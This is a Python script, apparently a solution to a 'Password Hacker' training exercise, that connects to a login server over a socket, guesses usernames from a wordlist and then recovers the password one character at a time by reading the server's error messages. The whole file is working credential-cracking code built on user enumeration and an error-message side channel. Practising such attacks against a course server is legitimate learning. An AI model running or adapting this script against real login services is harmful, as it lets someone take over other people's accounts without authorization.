import socket
import argparse
import string
import json

WRONG_LOGIN = "Wrong login!"
WRONG_PW = "Wrong password!"
EXCEPTION = "Exception happened during login"
SUCCESS = "Connection success!"
PW_CHARS = string.ascii_letters + string.digits


def try_login(client, login):
    data = {'login': login, 'password': ' '}
    client.send(json.dumps(data).encode())
    resp = json.loads(client.recv(256).decode())
    if resp['result'] == WRONG_PW:
        return True


def crack_login(client, login_file):
    for login in map(str.strip, login_file):
        if try_login(client, login):
            return login


def try_pass(client, login, attempt):
    data = {'login': login, 'password': attempt}
    client.send(json.dumps(data).encode())
    resp = json.loads(client.recv(256).decode())
    return resp['result']


def crack_pass(client, login):
    sub_pass = ''
    while True:
        for char in PW_CHARS:
            attempt = sub_pass + char
            result = try_pass(client, login, attempt)
            if result == EXCEPTION:
                sub_pass = attempt
            elif result == SUCCESS:
                return attempt


def main():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('IP_address')
    arg_parser.add_argument('port', type=int)
    cli_args = arg_parser.parse_args()
    login_path = ('C:/Users/Julian/PycharmProjects/Password Hacker'
                  '/Password Hacker/task/hacking/logins.txt')

    with socket.socket() as client, open(login_path) as login_file:
        client.connect((cli_args.IP_address, cli_args.port))
        login = crack_login(client, login_file)
        password = crack_pass(client, login)
        print(json.dumps({'login': login, 'password': password}))


if __name__ == '__main__':
    main()
